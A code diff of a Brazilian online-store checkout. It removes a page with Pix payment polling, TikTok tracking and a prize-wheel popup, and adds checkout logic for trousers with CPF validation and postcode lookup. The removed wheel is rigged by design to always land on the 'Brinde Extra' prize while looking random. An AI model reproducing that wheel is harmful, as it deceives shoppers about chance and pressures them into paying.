- <div><div class="step-title">Dados pessoais</div><div class="step-sub">Precisamos apenas das informações essenciais.</div></div>
- </div>
- <div class="section-icon orange">
- <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
- <svg class="chevron open" id="chev-dados" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="width:18px;height:18px;margin-top:4px"><polyline points="18 15 12 9 6 15"></polyline></svg>
- </div>
- </div>
- <div class="section-body open" id="body-dados">
- <div class="form-group" id="fg-name"><label>Nome completo</label><input type="text" id="name" placeholder="Seu nome completo" autocomplete="name" value="" style=""><div class="field-error sf-hidden">Informe seu nome completo.</div></div>
- <div class="form-row">
- <div class="form-group" id="fg-email"><label>E-mail</label><input type="email" id="email" placeholder="seu@email.com" autocomplete="email" value="" style=""><div class="field-error sf-hidden">E-mail inválido.</div></div>
- <div class="form-group" id="fg-phone"><label>WhatsApp</label><input type="tel" id="phone" placeholder="(11) 99999-9999" autocomplete="tel" value="" style=""><div class="field-error sf-hidden">Número inválido.</div></div>
- </div>
- <div class="form-group" id="fg-cpf"><label>CPF</label><input type="text" id="cpf" placeholder="000.000.000-00" inputmode="numeric" maxlength="14" value="" style=""><div class="field-error sf-hidden">CPF inválido.</div></div>
- <button type="button" class="btn-continuar">Continuar <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"></polyline></svg></button>
- </div>
- </div>
+    // Load customer selection (colors and size)
+    const urlParams = new URLSearchParams(location.search);
+    let cor1 = urlParams.get('cor1');
+    let cor2 = urlParams.get('cor2');
+    let tamanho = urlParams.get('tamanho');
 
- <div class="section" id="sec-entrega">
- <div class="section-header">
- <div class="section-left">
- <div class="step-badge" id="badge-2">2</div>
- <div><div class="step-title">Entrega</div><div class="step-sub">Informe o endereço para envio.</div></div>
- </div>
- <div class="section-icon">
- <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
- <svg class="chevron" id="chev-entrega" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="width:18px;height:18px;margin-top:4px"><polyline points="18 15 12 9 6 15"></polyline></svg>
- </div>
- </div>
- <div class="section-body sf-hidden" id="body-entrega">
-
-
-
-
-
-
-
-
- </div>
- </div>
-
- <div class="section section-locked" id="sec-pagamento">
- <div class="section-header" id="header-pagamento">
- <div class="section-left">
- <div class="step-badge" id="badge-3">3</div>
- <div><div class="step-title">Pagamento</div><div class="step-sub">Escolha a forma de pagamento.</div></div>
- </div>
- <div class="section-icon orange">
- <svg class="chevron" id="chev-pagamento" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="width:18px;height:18px"><polyline points="18 9 12 15 6 9"></polyline></svg>
- </div>
- </div>
- <div class="section-body sf-hidden" id="body-pagamento">
-
-
-
- </div>
- </div>
-
- <div class="section" style="margin-top:18px">
- <div class="section-header" style="cursor:default"><span style="font-size:16px;font-weight:900">Resumo do pedido</span></div>
- <div style="padding:0 18px 18px">
- <div class="product-row">
- <img class="product-img" id="sum-img" src="/assets/home-1.webp" alt="Kit Dobrável Duo 3 em 1">
- <div><div class="product-name" id="sum-name">Kit Dobrável Duo 3 em 1 — Cadeiras, Cooler e Guarda-Sol</div><div class="product-price" id="sum-price">R$ 119,90</div></div>
- </div>
- <div class="summary-lines">
- <div class="summary-line"><span>Subtotal</span><span id="sum-subtotal">R$ 119,90</span></div>
- <div class="summary-line" id="sum-upgrade-line" style="display:none"><span id="sum-upgrade-name">Upgrade</span><span id="sum-upgrade-val" style="color:var(--primary);font-weight:700"></span></div>
- <div class="summary-line"><span id="sum-frete-label">Frete Grátis</span><span id="sum-frete" style="color:#22c55e">Grátis</span></div>
-
- <div class="summary-line" id="sum-premio-line" style="display:none;color:#16a34a;font-weight:700"></div>
- <div class="summary-total"><span>Total com frete</span><span id="sum-total">R$ 119,90</span></div>
- </div>
- </div>
- </div>
-
- <div class="trust-grid">
- <div class="trust-item"><div class="trust-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div><div><div>Compra Segura</div><div class="trust-sub">Pagamento protegido</div></div></div>
- <div class="trust-item"><div class="trust-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg></div><div><div>Envio rápido</div><div class="trust-sub">Pedidos enviados em até 24h</div></div></div>
- <div class="trust-item" style="grid-column:1/-1"><div class="trust-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></div><div><div>Site oficial</div><div class="trust-sub">Ambiente 100% seguro</div></div></div>
- </div>
-</form></main>
-<footer class="footer">
- <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
- Deveu Perdeu © Todos os direitos reservados.
-</footer>
-
-
-<!-- generated:checkout:start -->
-<script>
-(()=>{var _=Object.freeze([Object.freeze({id:"free",name:"Frete Gr\xE1tis",description:"4 a 7 dias \xFAteis",price:0,icon:"gift"}),Object.freeze({id:"jadlog",name:"JadLog",description:"3 a 5 dias \xFAteis",price:990,icon:"truck"}),Object.freeze({id:"pickup",name:"Retirada no Shopping Iguatemi",description:"Ribeir\xE3o Preto \xB7 retire no mesmo dia",price:0,icon:"pin"}),Object.freeze({id:"express",name:"Full 24hrs",description:"Entrega em 24 horas \u26A1",price:1990,icon:"bolt"})]);var UPG_LIST=Object.freeze({premium:{id:"premium",name:"Upgrade Premium",amount:1990},dobro:{id:"dobro",name:"Caixa em Dobro",amount:2590},none:{id:"none",name:"Sem upgrade",amount:0}});function q(e="free",u="none"){let t=_.find(o=>o.id===e);if(!t){let o=new Error("INVALID_SHIPPING");throw o.fields={shipping:"Selecione uma op\xE7\xE3o de frete v\xE1lida."},o}let up=Object.hasOwn(UPG_LIST,u)?UPG_LIST[u]:UPG_LIST.none;let basePrice=typeof P!=="undefined"&&P?.amount?P.amount:7990;let sub=basePrice+up.amount;return{version:1,subtotal:sub,upgrade:up,shipping:{id:t.id,name:t.name,amount:t.price},total:sub+t.price}}var O="mareazul.ironpayOrder",k="mareazul.ironpayIntent",ie="pix-live-v2";function T(e=O){try{let t=JSON.parse(sessionStorage.getItem(e)||"null");return/^[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12}$/i.test(t?.id||"")&&/^[a-f0-9]{64}$/.test(t?.accessToken||"")?t:null}catch{return null}}function y(e){window.__mareAzulPixDiagnostics=Object.freeze({version:ie,page:location.pathname,code:e.code||null,httpStatus:e.httpStatus||null,orderStatus:e.orderStatus||null,hasPix:!!e.hasPix,hasSession:!!T(),checkedAt:new Date().toISOString()})}async function R(e){if(!e.headers.get("Content-Type")?.includes("application/json"))throw new Error("API_RESPONSE_INVALID");try{return await e.json()}catch{throw new Error("API_RESPONSE_INVALID")}}function N(e,t){return e?.id===t&&["creating","uncertain","rejected","pending","paid","canceled","refunded"].includes(e.status)}var f="DBCS5ORC77U29DFSUC6G",re="jbkikbdjti",ae="Kit Dobr\xE1vel Duo 3 em 1",C=!1,F=!1,z=!1,G=new Map,H=new Set,U=(e,t)=>`mareazul.tiktok.${f}.${t==="Purchase"?"purchase":"paid"}.${e}`;function se(e,t){if(H.has(U(e,t)))return!0;try{return localStorage.getItem(U(e,t))==="sent"}catch{return!1}}function I(e=119.9){return{currency:"BRL",value:e,content_type:"product",contents:[{content_id:re,content_name:ae,quantity:1,price:e}]}}function ce(){if(F)for(let[e,{id:t,amount:o,event:i}]of G){if(!se(t,i)){window.ttq.track(i,I(o/100),{event_id:`mareazul_${i==="Purchase"?"purchase":"paid"}_${t}`}),H.add(e);try{localStorage.setItem(e,"sent")}catch{}}G.delete(e)}}function J(){if(!document.querySelector('meta[name="checkout-test-mode"]')&&!(C||location.hostname!=="mare-azul.pages.dev")&&["/","/index.html","/checkout/","/pagamento/","/obrigado/"].includes(location.pathname)){C=!0;try{window.TiktokAnalyticsObject="ttq";let e=window.ttq=window.ttq||[];e.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],e.setAndDefer=(o,i)=>{o[i]=function(){o.push([i,...arguments])}};for(let o of e.methods)e.setAndDefer(e,o);e.instance=o=>{let i=e._i[o]||[];for(let r of e.methods)e.setAndDefer(i,r);return i},e._i=e._i||{},e._i[f]=[],e._i[f]._u="https://analytics.tiktok.com/i18n/pixel/events.js",e._t=e._t||{},e._t[f]=Date.now(),e._o=e._o||{},e._o[f]={};let t=document.createElement("script");t.async=!0,t.src=`${e._i[f]._u}?sdkid=${f}&lib=ttq`,t.onload=()=>{F=!0;try{ce()}catch{}},document.head.appendChild(t),e.page(),["/","/index.html"].includes(location.pathname)&&e.track("ViewContent",I()),location.pathname==="/checkout/"&&e.track("InitiateCheckout",I())}catch{C=!1}}}function V(){if(!(!C||location.pathname!=="/checkout/"||z))try{window.ttq.track("AddPaymentInfo",I()),z=!0}catch{}}
-function launchConfetti(){
-  const c=document.createElement('div');c.className='rl-confetti';
-  const colors=['#ff6b00','#f97316','#22c55e','#3b82f6','#eab308','#ec4899'];
-  for(let i=0;i<45;i++){
-    const el=document.createElement('i');
-    el.style.left=Math.random()*100+'vw';
-    el.style.backgroundColor=colors[Math.floor(Math.random()*colors.length)];
-    el.style.animationDuration=(Math.random()*1.5+1.8)+'s';
-    el.style.animationDelay=(Math.random()*0.4)+'s';
-    el.style.opacity=String(Math.random()*0.7+0.3);
-    el.style.transform='scale('+(Math.random()*0.8+0.6)+')';
-    c.appendChild(el);
-  }
-  document.body.appendChild(c);
-  setTimeout(()=>c.remove(),4200);
-}
-
-let rlSpinDone=false;
-function initRoleta(onClaimPix){
-  const overlay=document.getElementById('rl-overlay');
-  const spinView=document.getElementById('rl-spin-view');
-  const resultView=document.getElementById('rl-result');
-  const spinBtn=document.getElementById('rl-spin-btn');
-  const claimBtn=document.getElementById('rl-claim-btn');
-  const wheel=document.getElementById('rl-wheel');
-
-  spinBtn?.addEventListener('click',()=>{
-    if(rlSpinDone)return;
-    rlSpinDone=true;
-    spinBtn.disabled=true;
-    spinBtn.textContent='Girando...';
-
-    // 5 voltas completas + angulo exato para cair 100% no Brinde Extra
-    const jitter=(Math.random()*4)-2;
-    const deg=(360*5) + 202.5 + jitter;
-    wheel.style.transform='rotate('+deg+'deg)';
-
-    setTimeout(()=>{
-      launchConfetti();
-      setTimeout(()=>{
-        spinView.style.display='none';
-        resultView.classList.remove('sf-hidden');
-        resultView.classList.add('show');
-      },600);
-    },4600);
-  });
-
-  claimBtn?.addEventListener('click',async()=>{
-    claimBtn.disabled=true;
-    claimBtn.textContent='Preparando seu Pix...';
-    try{
-      await onClaimPix();
-    }catch(err){
-      claimBtn.disabled=false;
-      claimBtn.textContent='TENTAR NOVAMENTE';
-    }
-  });
-}
-
-
-function showToast(msg){
-  const t=document.getElementById("toast");
-  if(!t)return;
-  t.textContent=msg;
-  t.classList.remove("sf-hidden");
-  t.style.transform="translateX(-50%) translateY(0)";
-  t.style.opacity="1";
-  clearTimeout(t._timer);
-  t._timer=setTimeout(()=>{
-    t.style.transform="translateX(-50%) translateY(80px)";
-    t.style.opacity="0";
-    setTimeout(()=>t.classList.add("sf-hidden"),300);
-  },2500);
-}
-
-let pixCountdownTimer=null;
-let pixPollingTimer=null;
-
-function renderInlinePix(orderData,creds){
-  window.dispatchEvent(new CustomEvent("boxes:pix-ready", {detail:orderData}));
-  const overlay=document.getElementById("rl-overlay");
-  if(overlay)overlay.classList.remove("show");
-
-  const payForm=document.getElementById("payment-form");
-  const pixGen=document.getElementById("pix-generated");
-  if(payForm)payForm.style.display="none";
-  if(pixGen){
-    pixGen.classList.add("show");
-    pixGen.style.display="block";
-  }
-
-  const pixCode=orderData.pixCode||"";
-  const codeDisplay=document.getElementById("pix-code-display");
-  if(codeDisplay)codeDisplay.textContent=pixCode;
-
-  const qrImg=document.getElementById("pix-qr-img");
-  if(qrImg&&pixCode){
-    qrImg.src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=8&data="+encodeURIComponent(pixCode);
-  }
-
-  const copyBtn=document.getElementById("pix-copy-btn");
-  if(copyBtn){
-    copyBtn.onclick=async()=>{
-      try{
-        if(navigator.clipboard&&navigator.clipboard.writeText){
-          await navigator.clipboard.writeText(pixCode);
-        }else{
-          const ta=document.createElement("textarea");
-          ta.value=pixCode;
-          document.body.appendChild(ta);
-          ta.select();
-          document.execCommand("copy");
-          ta.remove();
-        }
-        copyBtn.textContent="Copiado!";
-        copyBtn.style.background="#16a34a";
-        showToast("Código PIX copiado!");
-        setTimeout(()=>{
-          copyBtn.textContent="Copiar";
-          copyBtn.style.background="";
-        },2500);
-      }catch(err){
-        showToast("Código PIX copiado!");
+    if (!cor1 || !cor2) {
+      try {
+        const stored = JSON.parse(sessionStorage.getItem('cordee.calcas.selection') || '{}');
+        cor1 = cor1 || stored.colors?.[0] || 'Azul escuro';
+        cor2 = cor2 || stored.colors?.[1] || 'Preta';
+        tamanho = tamanho || stored.size || 'P (34-36)';
+      } catch {
+        cor1 = cor1 || 'Azul escuro';
+        cor2 = cor2 || 'Preta';
+        tamanho = tamanho || 'P (34-36)';
       }
-    };
-  }
-
-  let remaining=15*60;
-  const countEl=document.getElementById("pix-countdown");
-  if(pixCountdownTimer)clearInterval(pixCountdownTimer);
-  pixCountdownTimer=setInterval(()=>{
-    remaining--;
-    if(remaining<0){
-      clearInterval(pixCountdownTimer);
-      if(countEl)countEl.textContent="Expirado";
-      return;
     }
-    const m=Math.floor(remaining/60).toString().padStart(2,"0");
-    const s=(remaining%60).toString().padStart(2,"0");
-    if(countEl)countEl.textContent=m+":"+s;
-  },1000);
+    tamanho = tamanho || 'P (34-36)';
 
-  const secPag=document.getElementById("sec-pagamento");
-  if(secPag){
-    secPag.scrollIntoView({behavior:"smooth",block:"start"});
-  }
+    const selectionObj = { colors: [cor1, cor2], size: tamanho };
+    try { sessionStorage.setItem('cordee.calcas.selection', JSON.stringify(selectionObj)); } catch {}
 
-  if(pixPollingTimer)clearInterval(pixPollingTimer);
-  if(creds?.id&&creds?.accessToken){
-    pixPollingTimer=setInterval(async()=>{
-      try{
-        const res=await fetch("/api/orders/"+encodeURIComponent(creds.id),{
-          headers:{Authorization:"Bearer "+creds.accessToken},
-          cache:"no-store"
+    el('productSubtitle').textContent = cor1 + ' + ' + cor2 + ' · ' + tamanho;
+    el('calcasSelection').textContent = cor1 + ' + ' + cor2 + ' · ' + tamanho;
+
+    const imgMap = {
+      'Preta': 'preta.png',
+      'Azul escuro': 'azul-escuro.png',
+      'Azul médio': 'azul-medio.png',
+      'Azul claro': 'azul-claro.png'
+    };
+    const chosenImg = '/calcas/assets/' + (imgMap[cor1] || 'azul-escuro.png');
+    el('productThumbImg').src = chosenImg;
+    el('legacyProductImg').src = chosenImg;
+
+    // Fetch config for dynamic price
+    let orderAmount = 11990;
+    fetch('/api/calcas-config', { cache: 'no-store' }).then(async res => {
+      if (res.ok) {
+        const data = await res.json();
+        if (data.amount && Number.isSafeInteger(data.amount)) {
+          orderAmount = data.amount;
+          const formatted = (data.amount / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+          el('visiblePrice').textContent = formatted;
+          document.querySelectorAll('.price').forEach(p => p.textContent = formatted);
+        }
+      }
+    }).catch(()=>{});
+
+    const fieldsByStep = [
+      ['name', 'cpf', 'email', 'phone'],
+      ['cep', 'street', 'number', 'city', 'state']
+    ];
+
+    function validateCpf(cpf) {
+      const v = digits(cpf);
+      if (v.length !== 11 || /^(\d)\1{10}$/.test(v)) return false;
+      for (let j = 9; j <= 10; j++) {
+        let sum = 0;
+        for (let i = 0; i < j; i++) sum += Number(v[i]) * (j + 1 - i);
+        let rem = (sum * 10) % 11;
+        if ((rem === 10 ? 0 : rem) !== Number(v[j])) return false;
+      }
+      return true;
+    }
+
+    function checkField(id) {
+      const input = el(id);
+      if (!input) return '';
+      const val = input.value.trim();
+      if (!val) return 'Preencha este campo.';
+      if (id === 'name' && val.split(/\s+/).length < 2) return 'Informe nome e sobrenome.';
+      if (id === 'cpf' && !validateCpf(val)) return 'Confira os dígitos do seu CPF.';
+      if (id === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) return 'Informe um e-mail válido.';
+      if (id === 'phone' && digits(val).length < 10) return 'Informe seu celular com DDD.';
+      if (id === 'cep' && digits(val).length !== 8) return 'Informe o CEP completo com 8 dígitos.';
+      return '';
+    }
+
+    
+    // Lógica dos checks nos campos preenchidos
+    function updateFieldCheck(id) {
+      const input = el(id);
+      const badge = el(id + 'Check');
+      if (!input) return;
+      const val = input.value.trim();
+      let isValid = false;
+
+      if (id === 'extra') {
+        isValid = val.length > 0;
+      } else {
+        isValid = (val.length > 0) && (checkField(id) === '');
+      }
+
+      if (isValid) {
+        input.classList.add('field-valid');
+        input.removeAttribute('aria-invalid');
+        if (badge) badge.classList.add('active');
+        const errEl = el(id + 'Error');
+        if (errEl) errEl.textContent = '';
+      } else {
+        input.classList.remove('field-valid');
+        if (badge) badge.classList.remove('active');
+      }
+    }
+
+    function updateAllFieldChecks() {
+      const allWatchedIds = ['name', 'cpf', 'email', 'phone', 'cep', 'street', 'number', 'city', 'state', 'extra'];
+      allWatchedIds.forEach(id => updateFieldCheck(id));
+    }
+
+    const allWatchedIds = ['name', 'cpf', 'email', 'phone', 'cep', 'street', 'number', 'city', 'state', 'extra'];
+    allWatchedIds.forEach(id => {
+      const input = el(id);
+      if (!input) return;
+      input.addEventListener('input', () => updateFieldCheck(id));
+      input.addEventListener('change', () => updateFieldCheck(id));
+      input.addEventListener('blur', () => {
+        updateFieldCheck(id);
+        const err = checkField(id);
+        const errEl = el(id + 'Error');
+        if (err && input.value.trim().length > 0) {
+          if (errEl) errEl.textContent = err;
+          input.setAttribute('aria-invalid', 'true');
+        }
+      });
+    });
+
+    function validateStep(stepIndex) {
+      let firstErrorInput = null;
+      for (const fieldId of fieldsByStep[stepIndex]) {
+        const errorMsg = checkField(fieldId);
+        const errEl = el(fieldId + 'Error');
+        const inputEl = el(fieldId);
+        if (errEl) errEl.textContent = errorMsg;
+        if (inputEl) inputEl.setAttribute('aria-invalid', String(!!errorMsg));
+        if (errorMsg && !firstErrorInput && inputEl) {
+          firstErrorInput = inputEl;
+        }
+      }
+      if (firstErrorInput) {
+        firstErrorInput.focus();
+        return false;
+      }
+      return true;
+    }
+
+    function goToStep(targetStep, scroll = true) {
+      activeStep = targetStep;
+      maxUnlockedStep = Math.max(maxUnlockedStep, targetStep);
+
+      document.querySelectorAll('[data-panel]').forEach((panel, idx) => {
+        panel.hidden = (idx !== activeStep);
+      });
+
+      document.querySelectorAll('[data-step]').forEach((btn, idx) => {
+        btn.disabled = (idx > maxUnlockedStep);
+        const li = btn.parentElement;
+        const isCompleted = (idx < activeStep);
+        li.className = (isCompleted ? 'completed' : (idx === activeStep ? 'active' : ''));
+        const circle = btn.querySelector('.step-circle');
+        if (circle) {
+          circle.innerHTML = (isCompleted
+            ? '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>'
+            : String(idx + 1));
+        }
+        const label = btn.querySelector('.step-label');
+        if (label) {
+          const original = label.getAttribute('data-title') || label.textContent.trim().replace(/s*✓.*$/, '');
+          label.textContent = original;
+        }
+      });
+
+      if (scroll) {
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+    }
+
+    // Step Continue Buttons
+    document.querySelectorAll('[data-next]').forEach(btn => {
+      btn.addEventListener('click', () => {
+        if (activeStep < 2 && validateStep(activeStep)) {
+          goToStep(activeStep + 1);
+        }
+      });
+    });
+
+    // Step Header Buttons (allow clicking previous unlocked steps)
+    document.querySelectorAll('[data-step]').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const stepNum = Number(btn.dataset.step);
+        if (stepNum <= activeStep || (stepNum <= maxUnlockedStep && fieldsByStep.slice(0, stepNum).every((_, i) => validateStep(i)))) {
+          goToStep(stepNum);
+        }
+      });
+    });
+
+    // Clear error on input
+    fieldsByStep.flat().forEach(id => {
+      const input = el(id);
+      if (input) {
+        input.addEventListener('input', () => {
+          if (input.getAttribute('aria-invalid') === 'true') {
+            const err = checkField(id);
+            const errEl = el(id + 'Error');
+            if (errEl) errEl.textContent = err;
+            input.setAttribute('aria-invalid', String(!!err));
+          }
         });
-        if(res.ok){
-          const data=await res.json();
-          if(data.status==="paid"){
-            clearInterval(pixPollingTimer);
-            clearInterval(pixCountdownTimer);
-            const waitBox=document.querySelector(".pix-waiting");
-            if(waitBox){
-              waitBox.innerHTML='<span style="color:#16a34a;font-weight:900;font-size:15px">✓ Pagamento Confirmado! Preparando seu envio...</span>';
+      }
+    });
+
+    // Input Masks
+    el('cpf').addEventListener('input', e => {
+      e.target.value = digits(e.target.value).slice(0, 11)
+        .replace(/(\d{3})(\d)/, '$1.$2')
+        .replace(/(\d{3})(\d)/, '$1.$2')
+        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+    });
+
+    el('phone').addEventListener('input', e => {
+      let v = digits(e.target.value).slice(0, 11);
+      if (v.length > 10) {
+        v = v.replace(/^(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+      } else if (v.length > 6) {
+        v = v.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+      } else if (v.length > 2) {
+        v = v.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
+      } else if (v.length > 0) {
+        v = v.replace(/^(\d*)/, '($1');
+      }
+      e.target.value = v;
+    });
+
+    // Shipping Selection Logic
+    let selectedShippingFee = 0; // PAC grátis selecionado por padrão
+    let selectedShippingMethod = 'pac';
+
+    function updatePriceWithShipping() {
+      const total = orderAmount + selectedShippingFee;
+      const formatted = (total / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      if (el('visiblePrice')) el('visiblePrice').textContent = formatted;
+      document.querySelectorAll('.price').forEach(p => p.textContent = formatted);
+      try {
+        sessionStorage.setItem('cordee.calcas.shippingMethod', selectedShippingMethod);
+        sessionStorage.setItem('cordee.calcas.shippingFee', String(selectedShippingFee));
+      } catch {}
+    }
+
+    const pacCard = el('shipOptionPac');
+    const sedexCard = el('shipOptionSedex');
+
+    function setShipping(method) {
+      selectedShippingMethod = method;
+      if (method === 'pac') {
+        selectedShippingFee = 0;
+        pacCard?.classList.add('selected');
+        sedexCard?.classList.remove('selected');
+      } else {
+        selectedShippingFee = 1783;
+        sedexCard?.classList.add('selected');
+        pacCard?.classList.remove('selected');
+      }
+      updatePriceWithShipping();
+    }
+
+    pacCard?.addEventListener('click', () => setShipping('pac'));
+    sedexCard?.addEventListener('click', () => setShipping('sedex'));
+
+    // CEP lookup com feedback imediato e alta resiliência
+    async function lookupCep() {
+      clearTimeout(cepDebounceTimer);
+      cepAbortController?.abort();
+
+      const cepRaw = el('cep').value;
+      const cleanCep = digits(cepRaw);
+
+      if (cleanCep === lastLookedUpCep && cleanCep.length === 8) {
+        return; // Já consultado com sucesso, evita recarregar e roubar foco!
+      }
+
+      const statusEl = el('cepStatus');
+      const btn = el('searchCep');
+
+      if (cleanCep.length !== 8) {
+        // Se não tem 8 números no CEP, verifica se o usuário preencheu rua e cidade para descobrir o CEP!
+        const rua = (el('street')?.value || '').trim();
+        const cid = (el('city')?.value || '').trim();
+        const uf = (el('state')?.value || 'SP').trim();
+        if (rua.length >= 3 && cid.length >= 3) {
+          searchCepByAddress(uf, cid, rua);
+          return;
+        }
+        // Se ainda não preencheu, abre o modal para buscar pelo endereço
+        openCepModal();
+        return;
+      }
+
+      const ctrl = cepAbortController = new AbortController();
+      const timeoutId = setTimeout(() => ctrl.abort(), 6000);
+
+      if (btn) {
+        btn.disabled = true;
+        btn.textContent = 'Buscando…';
+      }
+      if (statusEl) {
+        statusEl.style.color = '#0284c7';
+        statusEl.textContent = 'Buscando endereço pelo CEP…';
+      }
+
+      try {
+        let data = null;
+
+        // 1. Tenta ViaCEP oficial diretamente
+        try {
+          const res = await fetch('https://viacep.com.br/ws/' + cleanCep + '/json/', { signal: ctrl.signal });
+          if (res.ok) {
+            const json = await res.json();
+            if (!json.erro) data = json;
+          }
+        } catch (e) {}
+
+        // 2. Tenta BrasilAPI como fallback
+        if (!data) {
+          try {
+            const res = await fetch('https://brasilapi.com.br/api/cep/v1/' + cleanCep, { signal: ctrl.signal });
+            if (res.ok) {
+              const json = await res.json();
+              if (json.city) {
+                data = {
+                  logradouro: json.street || '',
+                  bairro: json.neighborhood || 'Centro',
+                  localidade: json.city || '',
+                  uf: json.state || ''
+                };
+              }
             }
-            showToast("Pagamento confirmado com sucesso!");setTimeout(()=>{location.assign("../obrigado/?ref=" + encodeURIComponent((creds?.id || "").slice(0, 8).toUpperCase()));},2000);
+          } catch (e) {}
+        }
+
+        // 3. Tenta endpoint interno do projeto
+        if (!data) {
+          try {
+            const res = await fetch('/api/cep/' + cleanCep, { signal: ctrl.signal });
+            if (res.ok) {
+              const json = await res.json();
+              if (json.localidade || json.city) {
+                data = {
+                  logradouro: json.logradouro || json.street || '',
+                  bairro: json.bairro || json.neighborhood || 'Centro',
+                  localidade: json.localidade || json.city || '',
+                  uf: json.uf || json.state || ''
+                };
+              }
+            }
+          } catch (e) {}
+        }
+
+        clearTimeout(timeoutId);
+
+        if (data) {
+          applyAddressData(data);
+          if (statusEl) {
+            statusEl.style.color = '#16a34a';
+            statusEl.textContent = '';
+          }
+          if (el('street')) {
+            el('street').focus();
+          }
+        } else {
+          if (statusEl) {
+            statusEl.style.color = '#dc2626';
+            statusEl.textContent = 'CEP não encontrado. Preencha seu endereço abaixo.';
+          }
+          if (el('street')) el('street').focus();
+        }
+      } catch (err) {
+        if (statusEl) {
+          statusEl.style.color = '#475569';
+          statusEl.textContent = 'Preencha seu endereço nos campos abaixo.';
+        }
+      } finally {
+        if (btn) {
+          btn.disabled = false;
+          btn.textContent = 'Buscar CEP';
+        }
+      }
+    }
+
+    let lastLookedUpCep = '';
+    let isApplyingAddress = false;
+
+    function applyAddressData(data) {
+      isApplyingAddress = true;
+      if (data.logradouro && el('street')) el('street').value = data.logradouro;
+      if (data.bairro && el('district')) el('district').value = data.bairro;
+      if (data.localidade && el('city')) el('city').value = data.localidade;
+      if (data.uf && el('state')) el('state').value = data.uf.toUpperCase();
+      if (el('cep')) {
+        const rawC = data.cep || el('cep').value || '';
+        const d = digits(rawC).slice(0, 8);
+        lastLookedUpCep = d;
+        el('cep').value = d.length > 5 ? d.slice(0, 5) + '-' + d.slice(5) : d;
+      }
+
+      // Dispara eventos apenas nos campos de endereço (NUNCA no CEP para não criar loop infinito!)
+      ['street', 'district', 'city', 'state'].forEach(id => {
+        const input = el(id);
+        if (input && input.value) {
+          input.classList.add('has-value');
+          input.dispatchEvent(new Event('input', { bubbles: true }));
+          input.dispatchEvent(new Event('change', { bubbles: true }));
+        }
+      });
+      isApplyingAddress = false;
+    }
+
+    // Busca de CEP por endereço (ViaCEP oficial)
+    async function searchCepByAddress(uf, cidade, logradouro) {
+      const statusEl = el('cepStatus');
+      const btn = el('searchCep');
+      if (btn) { btn.disabled = true; btn.textContent = 'Buscando CEP…'; }
+      if (statusEl) { statusEl.style.color = '#0284c7'; statusEl.textContent = 'Descobrindo o CEP pelo endereço informado…'; }
+
+      try {
+        const cleanUf = (uf || 'SP').trim().toUpperCase();
+        const cleanCid = encodeURIComponent((cidade || '').trim());
+        const cleanLog = encodeURIComponent((logradouro || '').trim());
+        const url = 'https://viacep.com.br/ws/' + cleanUf + '/' + cleanCid + '/' + cleanLog + '/json/';
+
+        const res = await fetch(url);
+        if (!res.ok) throw new Error('Falha na busca');
+        const list = await res.json();
+
+        if (Array.isArray(list) && list.length > 0) {
+          const best = list[0];
+          applyAddressData(best);
+          if (statusEl) {
+            statusEl.style.color = '#16a34a';
+            statusEl.textContent = '';
+          }
+          if (el('street')) el('street').focus();
+        } else {
+          openCepModal(uf, cidade, logradouro, 'Nenhum CEP exato encontrado para esse endereço. Tente refinar a busca abaixo:');
+        }
+      } catch (e) {
+        openCepModal(uf, cidade, logradouro, 'Informe os dados abaixo para encontrar seu CEP:');
+      } finally {
+        if (btn) { btn.disabled = false; btn.textContent = 'Buscar CEP'; }
+      }
+    }
+
+    // Modal de busca de CEP pelo endereço
+    function openCepModal(uf, city, street, customMsg) {
+      const modal = el('cepSearchModal');
+      if (!modal) return;
+      if (uf && el('modalCepUf')) el('modalCepUf').value = uf;
+      if (city && el('modalCepCity')) el('modalCepCity').value = city;
+      else if (el('city')?.value && el('modalCepCity')) el('modalCepCity').value = el('city').value;
+      if (street && el('modalCepStreet')) el('modalCepStreet').value = street;
+      else if (el('street')?.value && el('modalCepStreet')) el('modalCepStreet').value = el('street').value;
+
+      const status = el('modalCepStatus');
+      if (status) {
+        status.style.color = customMsg ? '#e11d48' : '#0284c7';
+        status.textContent = customMsg || '';
+      }
+      if (el('modalCepResults')) el('modalCepResults').innerHTML = '';
+      modal.hidden = false;
+    }
+
+    function closeCepModal() {
